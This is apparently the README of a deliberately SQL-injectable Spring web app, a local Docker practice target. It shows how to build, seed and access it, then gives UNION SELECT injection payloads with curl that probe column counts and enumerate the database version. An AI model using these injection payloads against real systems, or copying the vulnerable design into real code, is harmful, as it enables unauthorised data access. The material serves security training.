# SQLi vulnerable Spring Application

# TL;DR

To build and run:
```
sudo docker build -t sqli_victim_webapp_java_spring .; sudo docker run --name victim.sqli.webapp_java_spring.tld -ti -p 127.0.0.1:5808:8080 sqli_victim_webapp_java_spring
```

To fill the database:

```
curl 'localhost:5808/sqlidemo/all'
curl localhost:5808/sqlidemo/add -d username=user -d password=password
```

To get access to the database:
```
sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -uuser -ppassword sqli_example
```

# SQLi

Check for union select:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,NULL -- "
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,'A'"
````

Enumerate database:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- "
curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SELECT+@@VERSION)+--+"
```
